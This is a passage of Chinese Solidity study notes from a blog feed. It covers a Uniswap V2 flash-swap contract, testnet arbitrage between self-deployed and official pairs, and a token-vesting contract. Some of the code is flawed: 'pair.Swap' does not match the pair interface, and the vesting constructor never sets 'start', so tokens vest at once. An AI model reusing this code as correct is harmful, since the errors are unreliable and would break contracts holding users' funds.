class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity 0.8.24;<br><br>import &#123;IUniswapV2Pair&#125; from &quot;./interfaces/IUniswapV2Pair.sol&quot;;<br>import &#123;IERC20&#125; from &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;<br><br>//import &#123;IERC20&#125; from &quot;../../../lib/forge-std/src/interfaces/IERC20.sol&quot;;<br>//import &#123;IERC20&#125; from &quot;../../aave-v3/AaveV3.test.sol&quot;;<br><br>    error InvalidToken();<br><br>contract UniswapV2FlashSwap &#123;<br>    IUniswapV2Pair private immutable pair;<br>    address private immutable token0;<br>    address private immutable token1;<br><br>    constructor(address _pair) &#123;<br>        pair = IUniswapV2Pair(_pair);<br>        token0 = pair.token0();<br>        token1 = pair.token1();<br>    &#125;<br><br>    function flashSwap(address token, uint256 amount) external &#123;<br>        // flashSwap有两个入参，token 指的是token0或者token1，amount指的是借出的数量<br>        if (token != token0 &amp;&amp; token != token1) &#123;<br>            revert InvalidToken();<br>        &#125;<br><br>        // Write your code here<br>        // Don’t change any other code<br><br>        // 1. Determine amount0Out and amount1Out<br>        // 1. 确定amount0Out和 amount1Out的数量，这两个必须有一个是0，之前pair合约swap函数的时候讲过<br>        // 具体哪个就要通过入参token来定义了,如果token是token0的话，那amount0Out就是借款数量，amount1Out就是0<br>        // 如果token 等于token0，amount0Out就是借款数量amount，amount1Out就是0<br>        // 否者就是token 等于token1，amount0Out就是0，amount1Out就是借款数量amount<br>        (uint256 amount0Out, uint256 amount1Out) =<br>            token == token0 ? (amount, uint256(0)) : (uint256(0), amount);<br><br>        // 2. Encode token and msg.sender as bytes // 把token和msg.sender进行编码进data,一会会传进uniswapV2call方法里面<br>        bytes memory data = abi.encode(token, msg.sender);<br><br>        // 3. Call pair.swap // 调用pair.swap方法<br>        //swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock &#123;<br>        pair.Swap(&#123;<br>            amount0Out: amount0Out,<br>            amount1Out: amount1Out,<br>            to: address(this),<br>            data: data<br>        &#125;);<br>    &#125;<br>    // 一个pair合约的swap方法被调用且data不为空，就会回调这个合约的uniswapV2Call函数<br>    // Uniswap V2 callback<br>    function uniswapV2Call(<br>        address sender,<br>        uint256 amount0,<br>        uint256 amount1,<br>        bytes calldata data<br>    ) external &#123;<br>        //在这里编写代码<br>        // 不要更改任何其他代码<br><br>        // 1. Require msg.sender is pair contract<br>        // 1. 需要 msg.sender 是一个 币对合约<br>        // 因为我们并不希望任何人都可以随意的调用这个方法，所以我们要加一些校验<br>        require(msg.sender == address(pair), &quot;NOT PAIR&quot;);<br>        // 2. Require sender is this contract<br>        // 2. 需要第一个入参sender 发送者是这个合约 ，也就是说需要本合约调用pair合约，这样pair合约里面传的msg.sender就是本合约--&gt;回调<br>        // 校验sender入参是否是本合约的地址,<br>        require(sender == address(this), &quot;SENDER NOT FLASH CONTRACT ADDRESS&quot;);<br><br>        // 这里在解释调用的路径，有两种情况<br>        // 第一种：当Alice 先调用FlashSwap合约来调用UniswapV2Pair合约swap方法传data的时候，这个sender就变成了FlashSwap<br>        // Alice -&gt; FlashSwap ---- to = FlashSwap ----&gt; UniswapV2Pair<br>        //                    &lt;-- sender = FlashSwap --<br>        // 第二种：当 Eve 直接调用UniswapV2Pair 合约的swap方法传data的时候，调用uniswapV2Call时sender就变成了Eve自己了<br>        // Eve ------------ to = FlashSwap -----------&gt; UniswapV2Pair<br>        //          FlashSwap &lt;-- sender = Eve --------<br><br>        // 3. Decode token and caller from data<br>        // 3. 从data中解码出来token 和caller,把data解码成2个地址<br>        (address token, address caller) = abi.decode(data, (address, address));<br>        // 4. Determine amount borrowed (only one of them is &gt; 0)<br>        // 确定借款金额，amount等于amount0 amount1中的1个<br>        // 这代码写的比较优雅，如果token==token0的话，amount就=amount0,否者就等于amount1<br>        uint256 amount = token == token0 ? amount0 : amount1;<br><br>        // 5. Calculate flash swap fee and amount to repay<br>        // 5. 计算闪电贷费用和偿还金额，<br>        // fee = borrowed amount * 3 / 997 + 1 to round up<br>        // 前面已经计算过了，fee等于amount * 3 / 997 + 1 to round up 加1是为了向上取整<br>        uint256 fee = amount * 3 / 997 + 1;<br>        // 偿还金额=借款金额+手续费<br>        uint256 amountToRepay = amount + fee;<br><br>        // 6. Get flash swap fee from caller<br>        // 6. 从调用者哪里收取闪电贷的费用<br>        // 从调用者转到此合约转fee<br>        IERC20(token).transferFrom(caller, address(this), fee);<br>        // 7. Repay Uniswap V2 pair<br>        // 7. 把借款金额+手续费金额 还给pair合约<br>        IERC20(token).transfer(address(pair), amountToRepay);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="9-三角套利实现"><a href="#9-三角套利实现" class="headerlink" title="9 三角套利实现"></a>9 三角套利实现</h1><h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><blockquote><p>[!NOTE]</p><p>当我们发现uniswap V2 的DAI&lt;&#x3D;&#x3D;&gt;WETH池子的ETHI单价为3000DAI，且sushiswap V2 的DAI&lt;&#x3D;&#x3D;&gt;WETH池子的ETH单价为3100DAI时，我们发现有100的价差，准备搬砖套利，准备从uniswap低买ETH到shushiswap高卖，但是手上没有💰，这个时候考虑去另一个池子里借DAI出来进行套利</p></blockquote><p>先讲一下流程步骤</p><p>Flash –&gt;uniswap –&gt; sushiswap–&gt; repay flash swap</p><p><img src="/img/web3/arbitrage1-1.png" alt="arbitrage1-1"></p><ol><li>先从DAI&#x2F;MKR的Uniswap的Pair合约借贷出 个DAI</li><li>使用 xx 个DAI 去uniswap 买 xx 个 eth</li><li>从uniswap得到了 xx 个ETH</li><li>拿这 xx 个ETH去sushiswap里面换DAI</li><li>从sushiswap那里得到 xx 个dai</li><li>把xx个dai还回 DAI&#x2F;MKR</li></ol><p>整个流程下来的收益为</p><p>收益 &#x3D; DAI OUT 3100颗 - DAI in 3000颗  - 之前算的闪电贷的fee 是 9 （3&#x2F;997乘3000啥的）- gas fee 20个&#x3D;71个DAI</p><p>但是他这里还讲了第二个思路</p><p>falsh swap –&gt; sushiswap —&gt;repay flash swap</p><p><img src="/img/web3/arbitrage1-2.png" alt="arbitrage1-1"></p><ol><li>从 uniswap 池子借出来WETH </li><li>去sushiswap 里面交易</li><li>从sushiswap 里面得到dai</li><li>去uniswap 还dai</li></ol><p>对，没错，是借weth 还dai</p><p>他这里讲解的是第二套方案，在前期我们准备一下</p><ol><li>创建sushi swap 的工厂合约–</li><li>创建sushi swap 的路由合约—路由依赖工厂合约</li><li>创建dai的erc20代币</li></ol><h2 id="工厂合约部署"><a href="#工厂合约部署" class="headerlink" title="工厂合约部署"></a>工厂合约部署</h2><p>代码</p><blockquote><p>[!IMPORTANT]</p><p>部署工厂合约的时候要注意，不能拿过来就直接部署了，需要加一串代码，拿到这个合约的哈希值，后面替换进路由合约里面的某个配置变量哈希值，修改合约获取init_code</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity =0.5.16;<br><br>import &#x27;./interfaces/IUniswapV2Factory.sol&#x27;;<br>import &#x27;./UniswapV2Pair.sol&#x27;;<br><br>contract UniswapV2Factory is IUniswapV2Factory &#123;<br>    address public feeTo;<br>    address public feeToSetter;<br>        bytes32  public constant INIT_CODE_PAIR_HASH = keccak256(abi.encodePacked(type(UniswapV2Pair).creationCode));<br><br><br>    mapping(address =&gt; mapping(address =&gt; address)) public getPair;<br>    address[] public allPairs;<br><br>    event PairCreated(address indexed token0, address indexed token1, address pair, uint);<br><br>    constructor(address _feeToSetter) public &#123;<br>        feeToSetter = _feeToSetter;<br>    &#125;<br><br>    function allPairsLength() external view returns (uint) &#123;<br>        return allPairs.length;<br>    &#125;<br><br>    function createPair(address tokenA, address tokenB) external returns (address pair) &#123;<br>        require(tokenA != tokenB, &#x27;UniswapV2: IDENTICAL_ADDRESSES&#x27;);<br>        // NOTE: sort tokens by address<br>        // address &lt;-&gt; 20 bytes hexadecimal &lt;-&gt; 160 bit number<br>        // 0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97 &lt;-&gt; 412311598482915581890913355723629879470649597847<br>        // address(1), address(2)<br>        (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA);<br>        require(token0 != address(0), &#x27;UniswapV2: ZERO_ADDRESS&#x27;);<br>        require(getPair[token0][token1] == address(0), &#x27;UniswapV2: PAIR_EXISTS&#x27;); // single check is sufficient<br>        // NOTE: creation code = runtime code + constructor args<br>        bytes memory bytecode = type(UniswapV2Pair).creationCode;<br>        // NOTE: deploy with create2 - UniswapV2Library.pairFor<br>        // NOTE: create2 addr &lt;- keccak256(creation bytecode) &lt;- constructor args<br>        // create2 addr = keccak256(0xff, deployer, salt, keccak256(creation bytecode))<br>        bytes32 salt = keccak256(abi.encodePacked(token0, token1));<br>        assembly &#123;<br>            // NOTE: pair = address(new UniswapV2Pair&#123;salt: salt&#125;());<br>            pair := create2(0, add(bytecode, 32), mload(bytecode), salt)<br>        &#125;<br>        // NOTE: call initialize to initialize contract without constructor args<br>        IUniswapV2Pair(pair).initialize(token0, token1);<br>        getPair[token0][token1] = pair;<br>        getPair[token1][token0] = pair; // populate mapping in the reverse direction<br>        allPairs.push(pair);<br>        emit PairCreated(token0, token1, pair, allPairs.length);<br>    &#125;<br><br>    function setFeeTo(address _feeTo) external &#123;<br>        require(msg.sender == feeToSetter, &#x27;UniswapV2: FORBIDDEN&#x27;);<br>        feeTo = _feeTo;<br>    &#125;<br><br>    function setFeeToSetter(address _feeToSetter) external &#123;<br>        require(msg.sender == feeToSetter, &#x27;UniswapV2: FORBIDDEN&#x27;);<br>        feeToSetter = _feeToSetter;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><ul><li><p>部署后查询IINIT_CODE_PAIR_HASH得到的是0x1567526c5ba241f15ce2526f20ce8fbba68eee22e5ae192edf3c23d68c07471d记得把0x去掉</p></li><li><p>工厂合约部署时要传手续费地址：0x0bCE5f4bC3fE031517BEdE917315142078235A28</p></li><li><p>部署后工厂合约地址：0xb8366B293d071eBf559e3c08dCE74135842ac68b</p></li><li><p>官方WETH地址：0x9EDCde0257F2386Ce177C3a7FCdd97787F0D841d</p></li></ul><h1 id="路由合约部署"><a href="#路由合约部署" class="headerlink" title="路由合约部署"></a>路由合约部署</h1><blockquote><p>[!IMPORTANT]</p><p>部署路由合约的时候要注意，里面有一串hash需要替换，位置在路由合约所引用的UniswapV2Library库的pairFor方法里面的hex’96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f’ &#x2F;&#x2F; init code hash 替换成上面我们部署的</p></blockquote><p>部署后的路由合约地址：0x86F24A21588955Cff75A7fB7295a8F15e7523B19</p><p>官方的路由地址：0x96ff7D9dbf52FdcAe79157d3b249282c7FABd409</p><h1 id="使用我们自己的工厂合约和路由合约创建新的代币池子"><a href="#使用我们自己的工厂合约和路由合约创建新的代币池子" class="headerlink" title="使用我们自己的工厂合约和路由合约创建新的代币池子"></a>使用我们自己的工厂合约和路由合约创建新的代币池子</h1><p>USDT&lt;&#x3D;&gt;WETH官方币对合约：0x5c1080C5180aa87688D4064FAcbF7A4520bF2339</p><p>USDT&lt;&#x3D;&gt;WETH我自己路由币对合约：0x84def32c79156DdAAB1Ef3df18F6D69229c223Ee</p><p>WAYC币对合约</p><p>再去路由合约添加流动性</p><p>查看我们自己的币对查看储备量</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go">=== RUN   TestQuery<br>token0Address =<span class="hljs-number">0x58278ebb4EbFA82ebF183E4CdEc1968391e59b6C</span><br>token1Address =<span class="hljs-number">0x9EDCde0257F2386Ce177C3a7FCdd97787F0D841d</span><br>token0 USDT 的储备为 <span class="hljs-number">499999999999999993000</span><br>token1 WETH 的储备为 <span class="hljs-number">400601805416248754</span><br>--- PASS: TestQuery (<span class="hljs-number">1.77</span>s)<br>PASS<br>计算一下币价，就是<span class="hljs-number">1</span>个Usdt值多少ETH<br>&gt;&gt;&gt; <span class="hljs-number">499999999999999993000</span>/<span class="hljs-number">400601805416248754</span><br><span class="hljs-number">1248.1221832749122</span><br>最小精度<span class="hljs-number">1</span>USDT 值钱 最小精度 <span class="hljs-number">1248.0</span> ETH-<span class="hljs-number">-18</span>位精度 <span class="hljs-number">1248</span>U换<span class="hljs-number">1</span>个ETH<br></code></pre></td></tr></table></figure><p>看看我们通过官方生成的币对的储备量</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go">=== RUN   TestQuery<br>token0Address =<span class="hljs-number">0x58278ebb4EbFA82ebF183E4CdEc1968391e59b6C</span><br>token1Address =<span class="hljs-number">0x9EDCde0257F2386Ce177C3a7FCdd97787F0D841d</span><br>token0 USDT 的储备为 <span class="hljs-number">1397388190571889679873</span><br>token1 WETH 的储备为 <span class="hljs-number">155684074817414249</span><br>&gt;&gt;&gt; <span class="hljs-number">1397388190571889679873</span>/<span class="hljs-number">155684074817414249</span><br><span class="hljs-number">8975.794038091191</span><br>&gt;&gt;&gt; <br>最小精度<span class="hljs-number">1</span>USDT 值钱 <span class="hljs-number">8998.86543198197</span> ETH-<span class="hljs-number">-18</span>位精度 <span class="hljs-number">9000</span>U换<span class="hljs-number">1</span>个ETH<br></code></pre></td></tr></table></figure><p>发现，我们合约的USDT是要比官方合约的USDT要便宜好多的</p><p>所以可以调用我们合约买，然后去官方合约卖</p><p>买多少颗呢？ 买个100颗试试</p><p>后面可以用multicaller批量去查</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go">=== RUN   TestMulticallerReserves<br>Pair <span class="hljs-number">0x5c1080C5180aa87688D4064FAcbF7A4520bF2339</span> reserves: <span class="hljs-number">1379716792343398537155</span> <span class="hljs-number">157684074817414249</span> (last update <span class="hljs-number">1751191111</span>)<br>Pair <span class="hljs-number">0x84def32c79156DdAAB1Ef3df18F6D69229c223Ee</span> reserves: <span class="hljs-number">517671398228491135718</span> <span class="hljs-number">386966361486578731</span> (last update <span class="hljs-number">1751191111</span>)<br>--- PASS: TestMulticallerReserves (<span class="hljs-number">0.75</span>s)<br>PASS<br>买了<span class="hljs-number">10</span>个苹果花了<span class="hljs-number">5</span>块钱，苹果多少钱<span class="hljs-number">1</span>个？<br><span class="hljs-number">5</span>/<span class="hljs-number">10</span>=<span class="hljs-number">0.5</span>元一个<br>同理，usdt多少以太坊<span class="hljs-number">1</span>个<br><span class="hljs-comment">// 我们的</span><br>&gt;&gt;&gt; <span class="hljs-number">157684074817414249</span>/<span class="hljs-number">1379716792343398537155</span>--&gt;token0是eth所以前面的是eth<br><span class="hljs-number">0.00011428727670233948</span> eth/颗<br><span class="hljs-comment">// 官方的</span><br>&gt;&gt;&gt; <span class="hljs-number">386966361486578731</span>/<span class="hljs-number">517671398228491135718</span>--&gt;token0是eth所以前面的是eth<br><span class="hljs-number">0.0007475135053062725</span> eth/颗<br>我们的要便宜，所以要去我们的那个买代币---不对，反了，<br>应该是官方的贵，先去买官方的，然后放到我们的这里卖<br></code></pre></td></tr></table></figure><h2 id="部署套利合约V1版本"><a href="#部署套利合约V1版本" class="headerlink" title="部署套利合约V1版本"></a>部署套利合约V1版本</h2><p>合约地址：<a href="https://sepolia.abscan.org/address/0x1D31065b35510463c906B25FE8a2fBb581a9Ff69">https://sepolia.abscan.org/address/0x1D31065b35510463c906B25FE8a2fBb581a9Ff69</a></p><p>合约地址：0x1D31065b35510463c906B25FE8a2fBb581a9Ff69‘</p><p>套利成功：<a href="https://sepolia.abscan.org/tx/0x7fe08e9616d45aa4c032dfb2ee8615098f2c1bfb25c166b1b5ce4520125681ab">https://sepolia.abscan.org/tx/0x7fe08e9616d45aa4c032dfb2ee8615098f2c1bfb25c166b1b5ce4520125681ab</a></p><h2 id="套利合约V1加强版，FlashSwap"><a href="#套利合约V1加强版，FlashSwap" class="headerlink" title="套利合约V1加强版，FlashSwap"></a>套利合约V1加强版，FlashSwap</h2><ul><li><p>1、借币</p><ul><li>借哪个？自己定义，如果入参传了true 就借params的token0,否者就借token 1</li><li>借多少？借params里面的amountIn</li></ul></li><li><p>2、套利</p><ul><li>还是调用内部的swap方法</li></ul></li><li><p>3、还币</p><ul><li>在回调函数uniswapV2Call里面写</li></ul></li></ul><p>合约地址 0x6021025064312A2c13641752Bc6D4Ed2C920483A</p><p>重新生成abi文件调用</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>08-6Solidity笔记之六线性释放代币锁时间锁代理合约</title>
    <link href="/2025/06/04/08-6Solidity%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%85%AD/"/>
    <url>/2025/06/04/08-6Solidity%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%85%AD/</url>
    
    <content type="html"><![CDATA[<h1 id="43-线性释放"><a href="#43-线性释放" class="headerlink" title="43. 线性释放"></a>43. 线性释放</h1><p>线性释放<code>ERC20</code>代币的合约。代码由<code>OpenZeppelin</code>的<code>VestingWallet</code>合约简化而来。</p><h2 id="线性释放"><a href="#线性释放" class="headerlink" title="线性释放"></a>线性释放</h2><p>线性释放指的是代币在归属期内匀速释放。举个例子，某私募持有365,000枚<code>ICU</code>代币，归属期为1年（365天），那么每天会释放1,000枚代币。</p><h3 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h3><p>线性释放合约中共有<code>1</code>个事件。</p><ul><li><code>ERC20Released</code>：提币事件，当受益人提取释放代币时释放。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract TokenVesting &#123;<br>    // 事件<br>    event ERC20Released(address indexed token, uint256 amount); // 提币事件<br></code></pre></td></tr></table></figure><h3 id="状态变量"><a href="#状态变量" class="headerlink" title="状态变量"></a>状态变量</h3><p>线性释放合约中共有<code>4</code>个状态变量。</p><ul><li><code>beneficiary</code>：受益人地址。</li><li><code>start</code>：归属期起始时间戳。</li><li><code>duration</code>：归属期，单位为秒。</li><li><code>erc20Released</code>：代币地址-&gt;释放数量的映射，记录受益人已领取的代币数量。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 状态变量<br>mapping(address =&gt; uint256) public erc20Released; // 代币地址-&gt;释放数量的映射，记录已经释放的代币<br>address public immutable beneficiary; // 受益人地址<br>uint256 public immutable start; // 起始时间戳<br>uint256 public immutable duration; // 归属期<br></code></pre></td></tr></table></figure><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>线性释放合约中共有<code>3</code>个函数。</p><ul><li>构造函数：初始化受益人地址，归属期(秒), 起始时间戳。参数为受益人地址<code>beneficiaryAddress</code>和归属期<code>durationSeconds</code>。为了方便，起始时间戳用的部署时的区块链时间戳<code>block.timestamp</code>。</li><li><code>release()</code>：提取代币函数，将已释放的代币转账给受益人。调用了<code>vestedAmount()</code>函数计算可提取的代币数量，释放<code>ERC20Released</code>事件，然后将代币<code>transfer</code>给受益人。参数为代币地址<code>token</code>。</li><li><code>vestedAmount()</code>：根据线性释放公式，查询已经释放的代币数量。开发者可以通过修改这个函数，自定义释放方式。参数为代币地址<code>token</code>和查询的时间戳<code>timestamp</code>。</li></ul><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: UNLICENSED<br>pragma solidity ^0.8.21;<br><br>import &#123;IERC20&#125; from &quot;./31_IERC20.sol&quot;;<br><br>contract TokenVesting &#123;<br><br><br>    // 事件<br>    // ERC20Released：提币事件，当受益人提取释放代币时释放。<br>    event ERC20Released(address indexed token,uint256 amount);<br>    // 状态变量<br>    //beneficiary：受益人地址。 // immutable 不可改变的变量<br>    address public immutable beneficiary;<br>    //start：归属期起始时间戳。<br>    uint256 public immutable start;<br>    //duration：归属期，单位为秒。<br>    uint256 public immutable duration;<br>    //erc20Released：代币地址-&gt;释放数量的映射，记录受益人已领取的代币数量。<br>    mapping(address=&gt;uint256) public erc20Released;<br>    // 函数<br>    //构造函数：初始化受益人地址，归属期(秒), 起始时间戳。参数为受益人地址 beneficiaryAddress 和归属期 durationSeconds。<br>    // 为了方便，起始时间戳用的部署时的区块链时间戳block.timestamp。<br>    constructor(address beneficiaryAddress,uint256 durationSeconds)&#123;<br>        beneficiary=beneficiaryAddress;<br>        duration=durationSeconds;<br>    &#125;<br>    //release()：提取代币函数，将已释放的代币转账给受益人。调用了vestedAmount()函数计算可提取的代币数量，释放ERC20Released事件，<br>    // 然后将代币transfer给受益人。参数为代币地址token。<br>    /**<br>     * @dev 受益人提取已释放的代币。<br>     * 调用vestedAmount()函数计算可提取的代币数量，然后transfer给受益人。<br>     * 释放 &#123;ERC20Released&#125; 事件.<br>     */<br>    function release(address token) public  &#123;<br>        // 调用vestedAmount()函数计算可提取的代币数量<br>        uint256 releasable=vestedAmount(token,uint256(block.timestamp))-erc20Released[token];<br>        // 更新已释放的代币数量<br>        erc20Released[token]+=releasable;<br>        // 转代币给受益人<br>        emit ERC20Released(token,releasable);<br>        IERC20(token).transfer(beneficiary,releasable);//给对应的人转对应数量的币<br><br>    &#125;<br>    //vestedAmount()：根据线性释放公式，查询已经释放的代币数量。开发者可以通过修改这个函数，自定义释放方式。<br>    //参数为代币地址token和查询的时间戳timestamp。<br>    /**<br>    * @dev 根据线性释放公式，计算已经释放的数量。开发者可以通过修改这个函数，自定义释放方式。<br>     * @param token: 代币地址<br>     * @param timestamp: 查询的时间戳<br>     */<br>    function vestedAmount(address token,uint256 timestamp)public view returns(uint256)  &#123;<br>        // 合约里面总共收到了多少代币(当前余额+已经提取)<br>        uint256 totalAllocation = IERC20(token).balanceOf(address(this))+erc20Released[token];<br>        // 根据线性释放共识，计算已经释放的数量<br>        if (timestamp&lt;start)&#123;<br>            return 0;<br>        &#125;else if(timestamp&gt;start+duration)&#123;<br>            return totalAllocation;<br>        &#125;else&#123;<br>            return(totalAllocation*(timestamp-start))/duration;<br>        &#125;<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="44-代币锁"><a href="#44-代币锁" class="headerlink" title="44. 代币锁"></a>44. 代币锁</h1><p>流动性提供者<code>LP</code>代币，为什么要锁定流动性，并写一个简单的<code>ERC20</code>代币锁合约。</p><p>代币锁(Token Locker)是一种简单的时间锁合约，它可以把合约中的代币锁仓一段时间，受益人在锁仓期满后可以取走代币。代币锁一般是用来锁仓流动性提供者<code>LP</code>代币的。</p><h3 id="什么是LP代币？"><a href="#什么是LP代币？" class="headerlink" title="什么是LP代币？"></a>什么是<code>LP</code>代币？</h3><p>区块链中，用户在去中心化交易所<code>DEX</code>上交易代币，例如<code>Uniswap</code>交易所。<code>DEX</code>和中心化交易所(<code>CEX</code>)不同，去中心化交易所使用自动做市商(<code>AMM</code>)机制，需要用户或项目方提供资金池，以使得其他用户能够即时买卖。简单来说，用户&#x2F;项目方需要质押相应的币对（比如<code>ETH/DAI</code>）到资金池中，作为补偿，<code>DEX</code>会给他们铸造相应的流动性提供者<code>LP</code>代币凭证，证明他们质押了相应的份额，供他们收取手续费。</p><h3 id="为什么要锁定流动性？"><a href="#为什么要锁定流动性？" class="headerlink" title="为什么要锁定流动性？"></a>为什么要锁定流动性？</h3><p>如果项目方毫无征兆的撤出流动性池中的<code>LP</code>代币，那么投资者手中的代币就无法变现，直接归零了。这种行为也叫<code>rug-pull</code>，仅2021年，各种<code>rug-pull</code>骗局从投资者那里骗取了价值超过28亿美元的加密货币。</p><p>但是如果<code>LP</code>代币是锁仓在代币锁合约中，在锁仓期结束以前，项目方无法撤出流动性池，也没办法<code>rug pull</code>。因此代币锁可以防止项目方过早跑路（要小心锁仓期满跑路的情况）。</p><h2 id="代币锁合约"><a href="#代币锁合约" class="headerlink" 